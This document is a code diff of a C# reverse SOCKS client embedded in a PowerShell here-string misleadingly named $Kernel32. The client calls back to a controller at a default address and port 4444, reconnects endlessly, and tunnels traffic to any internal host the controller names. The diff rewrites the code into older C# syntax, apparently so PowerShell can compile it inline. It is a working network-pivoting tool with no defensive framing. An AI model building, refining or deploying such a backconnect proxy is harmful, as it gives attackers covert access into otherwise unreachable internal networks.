@@ -1,31 +1,36 @@
 $Kernel32 = @"
 using System;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
-using System.Net;
 
 class ReverseSocksClient
 {
-    static async Task Main(string[] args)
+    public static async Task Main(string[] args)
     {
         string serverIp = args.Length > 0 ? args[0] : "1.2.3.4";
         int serverPort = args.Length > 1 ? int.Parse(args[1]) : 4444;
 
         while (true)
         {
+            TcpClient control = null;
             try
             {
-                using TcpClient control = new TcpClient();
+                control = new TcpClient();
                 await control.ConnectAsync(serverIp, serverPort);
                 Console.WriteLine("[*] Connected to controller.");
                 await ControlLoop(control.GetStream());
             }
             catch (Exception e)
             {
-                Console.WriteLine($"[!] Error: {e.Message}. Reconnecting...");
+                Console.WriteLine("[!] Error: " + e.Message);
                 await Task.Delay(3000);
+            }
+            finally
+            {
+                if (control != null)
+                    control.Close();
             }
         }
     }
@@ -36,19 +41,20 @@ class ReverseSocksClient
 
         while (true)
         {
-            int header = control.ReadByte(); // 0x01 = CONNECT command
-            if (header != 0x01) break;
+            int header = control.ReadByte();
+            if (header != 0x01)
+                break;
 
             int ipLen = control.ReadByte();
             control.Read(buffer, 0, ipLen);
             string targetHost = ipLen == 4
-                ? new IPAddress(buffer[..ipLen]).ToString()
+                ? new IPAddress(new byte[] { buffer[0], buffer[1], buffer[2], buffer[3] }).ToString()
                 : Encoding.ASCII.GetString(buffer, 0, ipLen);
 
             control.Read(buffer, 0, 2);
             int targetPort = (buffer[0] << 8) | buffer[1];
 
-            Console.WriteLine($"[*] CONNECT to {targetHost}:{targetPort}");
+            Console.WriteLine("[*] CONNECT to " + targetHost + ":" + targetPort);
 
             TcpClient internalClient = new TcpClient();
             try
@@ -56,8 +62,9 @@ class ReverseSocksClient
                 await internalClient.ConnectAsync(targetHost, targetPort);
                 control.WriteByte(0x02); // success
 
-                _ = Task.Run(() => Pipe(internalClient.GetStream(), control));
-                await Pipe(control, internalClient.GetStream());
+                NetworkStream targetStream = internalClient.GetStream();
+                Task.Run(() => Pipe(targetStream, control));
+                await Pipe(control, targetStream);
             }
             catch
             {
@@ -83,8 +90,8 @@ class ReverseSocksClient
         catch { }
         finally
         {
-            src.Close();
-            dst.Close();
+            try { src.Close(); } catch { }
+            try { dst.Close(); } catch { }
         }
     }
 }
